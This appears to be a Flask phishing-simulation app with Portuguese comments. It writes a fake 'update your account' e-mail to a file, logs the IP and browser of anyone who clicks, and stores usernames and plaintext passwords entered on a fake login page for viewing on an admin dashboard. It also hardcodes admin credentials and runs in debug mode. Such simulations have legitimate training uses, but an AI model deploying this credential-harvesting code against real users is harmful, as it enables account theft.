from flask import Flask, request, render_template, redirect, session, url_for
import sqlite3
import os
from datetime import datetime
import uuid

app = Flask(__name__)
app.secret_key = 'your-secret-key'  # Substitua por uma chave segura

# Inicializar banco de dados
def init_db():
    db_path = 'database.db'
    # Se o banco de dados existir, excluí-lo para recriar
    if os.path.exists(db_path):
        os.remove(db_path)
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clicks
                (user_id TEXT, ip TEXT, browser TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logins
                (user_id TEXT, username TEXT, password TEXT, ip TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()
    print("Banco de dados inicializado com sucesso.")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_email', methods=['GET'])
def send_email():
    recipient = request.args.get('email')
    if not recipient or not '@' in recipient:
        return "Erro: Forneça um endereço de e-mail válido", 400
    
    print(f"Simulando envio para {recipient}")
    user_id = str(uuid.uuid4())
    link = f"http://127.0.0.1:5000/login?user_id={user_id}"
    
    with open('templates/email.html', 'r') as f:
        email_content = f.read().replace('{{link}}', link)
    
    # Simular envio salvando em um arquivo
    try:
        with open('simulated_emails.txt', 'a') as f:
            f.write(f"Para: {recipient}\nAssunto: Atualize sua conta agora!\nLink: {link}\nConteúdo:\n{email_content}\n---\n")
        print(f"E-mail simulado para {recipient}. Link: {link}")
        return f"E-mail simulado com sucesso! Verifique simulated_emails.txt ou use o link: <a href='{link}'>{link}</a>"
    except Exception as e:
        print(f"Erro ao simular e-mail: {str(e)}")
        return f"Erro ao simular e-mail: {str(e)}"

# Rota para página de login falsa
@app.route('/login', methods=['GET'])
def login_page():
    user_id = request.args.get('user_id')
    if not user_id:
        return "Erro: user_id inválido", 400
    
    # Registrar clique
    ip = request.remote_addr
    browser = request.user_agent.string
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    with sqlite3.connect('database.db') as conn:
        c = conn.cursor()
        c.execute("INSERT INTO clicks (user_id, ip, browser, timestamp) VALUES (?, ?, ?, ?)", 
                  (user_id, ip, browser, timestamp))
        conn.commit()
    
    return render_template('login.html', user_id=user_id)

# Rota para processar login falso
@app.route('/submit_login', methods=['POST'])
def submit_login():
    user_id = request.form.get('user_id')
    username = request.form.get('username')
    password = request.form.get('password')  # Novo campo
    
    if not user_id or not username:
        return "Erro: parâmetros inválidos", 400
    
    ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    with sqlite3.connect('database.db') as conn:
        c = conn.cursor()
        c.execute("INSERT INTO logins (user_id, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)", 
                  (user_id, username, password, ip, timestamp))
        conn.commit()
    
    return render_template('result.html')

# Rota para login do admin
@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == 'admin' and password == 'admin123':  # Substitua por credenciais seguras
            session['logged_in'] = True
            return redirect(url_for('admin'))
        return "Credenciais inválidas"
    return render_template('admin_login.html')

# Rota para dashboard do admin
@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    with sqlite3.connect('database.db') as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM clicks")
        clicks = c.fetchall()
        c.execute("SELECT * FROM logins")
        logins = c.fetchall()
        c.execute("SELECT ip, COUNT(*) as count FROM clicks GROUP BY ip ORDER BY count DESC")
        ip_counts = c.fetchall()
    
    return render_template('admin.html', clicks=clicks, logins=logins, ip_counts=ip_counts)

if __name__ == '__main__':
    init_db()
    app.run(debug=True)